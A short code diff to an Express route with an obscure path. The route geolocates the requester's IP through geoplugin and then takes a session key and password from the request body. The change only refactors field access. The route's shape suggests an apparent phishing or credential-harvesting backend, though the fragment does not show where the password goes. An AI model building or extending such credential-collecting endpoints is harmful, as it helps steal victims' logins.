@@ -25,20 +25,13 @@ app.post("/UD92290", async (req, res) => {
       console.log("err: ", err);
     })
 
-    const {
-      geoplugin_request,
-      geoplugin_city,
-      geoplugin_region,
-      geoplugin_countryName,
-      geoplugin_countryCode,
-    } = response.data
-
+    const r = response.data
     const gottenAddress = {
-      ip: geoplugin_request,
-      city: geoplugin_city,
-      region: geoplugin_region,
-      countryName: geoplugin_countryName,
-      countryCode: geoplugin_countryCode,
+      ip: r?.geoplugin_request,
+      city: r?.geoplugin_city,
+      region: r?.geoplugin_region,
+      countryName: r?.geoplugin_countryName,
+      countryCode: r?.geoplugin_countryCode,
     }
 
     const { session_key, password } = req.body
